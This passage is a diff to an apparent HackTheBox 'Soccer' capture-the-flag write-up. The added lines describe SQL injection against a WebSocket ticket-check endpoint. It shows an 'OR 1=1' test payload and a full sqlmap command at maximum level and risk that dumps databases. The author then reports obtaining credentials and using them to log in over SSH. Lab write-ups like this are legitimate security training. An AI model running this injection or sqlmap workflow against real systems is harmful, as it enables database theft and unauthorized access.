@@ -115,3 +115,14 @@ When i tryed {"id":"71080 OR 1=1"} i got Ticket Exists, now i'm sure there is a 
   var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
         window.onload = function () {
 ```
+
+Here's sqlmap request:```sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch``` Let's check what we can take by this.
+Okay this looks intresting we need to modifay little bit our request.
+
+![image](https://github.com/Anogota/Soccer/assets/143951834/7d558a17-d08d-48c5-9712-bdd37cc29a0e)
+
+We got some credentials, lets go by this credentials log in to SSH
+And we got this:
+
+![image](https://github.com/Anogota/Soccer/assets/143951834/4a13c597-d857-48fd-bca7-4445c2969027)
+
